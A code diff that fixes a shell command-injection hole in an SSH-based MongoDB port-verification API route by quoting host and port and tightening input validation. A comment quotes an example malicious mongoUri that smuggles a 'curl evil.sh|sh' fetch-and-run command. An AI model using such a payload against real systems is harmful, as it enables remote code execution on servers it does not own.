@@ -6,6 +6,7 @@ import { ConnectionRepository } from '@/lib/repositories/ConnectionRepository';
 import { Client as SshClient } from 'ssh2';
 import { decryptWithMetadata } from '@/utils/encryption';
 import { logger } from '@/lib/logger';
+import { shellQuote, shellInt } from '@/utils/shellQuote';
 
 // Helper: quick SSH exec → returns stdout+stderr
 function sshExec(sshConfig, command, timeoutMs = 10000) {
@@ -94,9 +95,14 @@ async function verifyPortViaSSH(sshConfig, port, host) {
   // 2. mongo (legacy)
   // 3. docker exec into a container that exposes the port
   // All run LOCAL to the server via SSH, so no firewall issues
+  // `host` can originate from a user-supplied mongoUri, and `port` is derived
+  // from it, so both must be quoted before being embedded in the script.
+  // An unquoted `HOST=<value>` turns a mongoUri like
+  //   mongodb://x;curl evil.sh|sh;:27017
+  // into arbitrary command execution on the SSH target.
   const script = `
-PORT=${port}
-HOST=${host || '127.0.0.1'}
+PORT=${shellInt(port) ?? '0'}
+HOST=${shellQuote(host || '127.0.0.1')}
 
 # First check if port is listening at all
 LISTENING=$(ss -tlnp 2>/dev/null | grep -c ":$PORT " || netstat -tlnp 2>/dev/null | grep -c ":$PORT " || echo 0)
@@ -221,10 +227,17 @@ export async function POST(request) {
     // ── ACTION: verify ── Verify a specific port via SSH (not direct connection)
     if (action === 'verify') {
       // Parse host:port from mongoUri (e.g. mongodb://3.1.41.227:27017)
-      const match = (mongoUri || '').match(/\/\/([^:/]+):(\d+)/);
+      // Restrict the host to plain hostname/IPv4 characters. The previous
+      // permissive pattern also allowed command separators, command
+      // substitution, backticks and spaces, all of which reached the remote
+      // shell unquoted.
+      const match = (mongoUri || '').match(/\/\/([a-zA-Z0-9._-]+):(\d+)/);
       if (!match) return NextResponse.json({ success: false, error: 'Invalid mongoUri format' }, { status: 400 });
       const [, host, portStr] = match;
-      const port = parseInt(portStr);
+      const port = parseInt(portStr, 10);
+      if (!Number.isInteger(port) || port < 1 || port > 65535) {
+        return NextResponse.json({ success: false, error: 'Invalid mongoUri port' }, { status: 400 });
+      }
 
       const result = await verifyPortViaSSH(sshConfig, port, host);
       return NextResponse.json({ success: true, ...result });
